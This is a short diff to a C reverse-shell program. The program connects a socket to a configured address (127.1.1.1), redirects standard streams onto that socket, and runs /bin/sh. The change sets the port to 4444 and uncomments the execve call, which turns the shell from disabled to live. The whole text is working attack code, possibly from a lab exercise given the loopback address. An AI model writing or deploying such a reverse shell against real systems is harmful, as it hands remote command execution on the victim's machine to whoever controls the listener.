@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #define REMOTE_ADDR "127.1.1.1"
-#define REMOTE_PORT 444
+#define REMOTE_PORT 4444
 
 int main(int argc, char *argv[])
 {
@@ -25,6 +25,6 @@ int main(int argc, char *argv[])
     dup2(s, 2);
     
     //final syscall execve
-//    execve("/bin/sh", 0, 0);
+    execve("/bin/sh", 0, 0);
     return 0;
 }
